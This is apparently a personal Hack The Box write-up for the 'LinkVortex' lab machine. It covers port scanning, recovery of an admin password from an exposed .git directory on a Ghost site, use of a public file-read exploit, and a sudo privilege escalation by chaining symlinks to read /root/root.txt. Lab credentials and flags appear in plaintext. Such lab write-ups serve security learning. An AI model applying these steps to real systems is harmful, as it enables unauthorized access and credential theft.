+++
title = "HTB - LinkVortex"
date = 2024-12-15
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.11.47           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 10:00 EST
Nmap scan report for 10.10.11.47
Host is up (0.13s latency).
Not shown: 65522 closed tcp ports (reset), 11 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.51 seconds
```

### Enumeration
80:
	Website that runs Ghost 5.58. Seems to be a Wix type of tool. Apache/Express
	Ghost 5.58 has authenticated arbitrary file read. https://security.snyk.io/package/npm/ghost/5.58.0 , https://github.com/0xyassine/CVE-2023-40028/blob/master/CVE-2023-40028.sh
	We find API through `/ghost/` directory. We're brought to a portal. We see `admin` user posts.
	Inferred login to be `admin@linkvortex.htb`. Information disclosure that tells us user is correct.
	Still need a password.
	Subdomain hunting with `ffuf` gives us `dev.linkvortex.htb`
	Good lesson here. When using `feroxbuster`, remember relevant file types. for the `dev` subdomain, specify `.git` file extensions for access to the goods.
	Installed `git-dumper` to aid in parsing information found
	We can search relevant authentication files: `find . -iname '*authentication*'`
	We find an administrator test file, and a password `OctopiFociPilfer45`
	We can logon with our credentials now. `admin@linkvortex.htb:OctopiFociPilfer45`
	Go back to authenticated file read, perhaps grab SSH key. 
	`./readd.sh -u admin@linkvortex.htb -p OctopiFociPilfer45`
	We get some information about a user `node`, but not much else. SSH key wasn't accessable.
	In the `github` repository dump, the `dockerfile.ghost` has an interesting feature. We find a path to a configuration file for the web server: `/var/lib/ghost/config.production.json`
	We can use our tool to read.
	We've got our credentials. `bob@linkvortex.htb:fibber-talented-worth`
USER:`6cd203dfcc1a040609a132b4d571cef0`

### Privilege Escalation
We are able to run `sudo -l`, and see we have access to a symlink script.
We can exploit improper symlink handling in the script through $CHECK_CONTENT, and read the high privilege flag.
Script:
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

```bash
bob@linkvortex:~$ export CHECK_CONTENT=true
bob@linkvortex:~$ touch link1.png
bob@linkvortex:~$ ln -sf /root/root.txt link1.png
bob@linkvortex:~$ touch link2.png
bob@linkvortex:~$ ln -sf /home/bob/link1.png link2.png
bob@linkvortex:~$ sudo bash /opt/ghost/clean_symlink.sh link2.png
```
ROOT:`99688ec8d92b2915ad7ec15d287fbcf3`
The script clean_symlink.sh, which users can execute with sudo, processes .png symlinks but contains a vulnerability in how it handles critical file checks. It verifies the symlink target to prevent access to directories like /root, but this check can be bypassed by chaining symlinks. By exporting CHECK_CONTENT=true, the user enables the script to display the content of quarantined files. They exploit this by creating a symlink (link1.png) pointing to /root/root.txt and another symlink (link2.png) pointing to link1.png. Running the script with sudo moves link2.png to the quarantine directory and, with CHECK_CONTENT=true, the script reads and outputs the contents of /root/root.txt, revealing the high-privilege flag. The issue stems from improper symlink handling, allowing indirect access to restricted files.